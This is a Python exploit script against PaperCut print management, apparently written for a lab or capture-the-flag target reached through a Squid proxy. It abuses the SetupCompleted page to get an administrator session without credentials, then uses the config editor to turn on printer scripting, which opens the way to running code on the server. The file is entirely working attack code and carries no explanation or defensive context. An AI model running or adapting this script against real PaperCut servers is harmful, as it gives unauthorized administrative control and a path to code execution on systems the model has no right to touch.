import argparse
import requests


def get_session_id(proxy):
    proxy = {"http": proxy}
    s = requests.Session()
    s.proxies.update(proxy)
    r = s.get(f'http://localhost:9191/app?service=page/SetupCompleted', verify=False)

    headers = {'Origin': f'http://localhost:9191'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
    r = s.post(f'http://localhost:9191/app', data=data, headers=headers, verify=False)
    if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):
        print(f'[*] Papercut instance is vulnerable! Obtained valid JSESSIONID')
        return s
    else:
        print(f'[-] Failed to get valid response, likely not vulnerable')
        return None


def set_setting(session, setting, enabled):
    print(f'[*] Updating {setting} to {enabled}')
    headers = {'Origin': f'http://localhost:9191'}
    data = {
        'service': 'direct/1/ConfigEditor/quickFindForm',
        'sp': 'S0',
        'Form0': '$TextField,doQuickFind,clear',
        '$TextField': setting,
        'doQuickFind': 'Go'
    }
    r = session.post(f'http://localhost:9191/app', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/ConfigEditor/$Form',
        'sp': 'S1',
        'Form1': '$TextField$0,$Submit,$Submit$0',
        '$TextField$0': enabled,
        '$Submit': 'Update'
    }
    r = session.post(f'http://localhost:9191/app', data=data, headers=headers, verify=False)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--proxy', help='squid proxy address example: http://10.10.10.10:3128', required=True)
    args = parser.parse_args()

    sess = get_session_id(args.proxy)
    if sess:
        set_setting(sess, setting='print-and-device.script.enabled', enabled='Y')

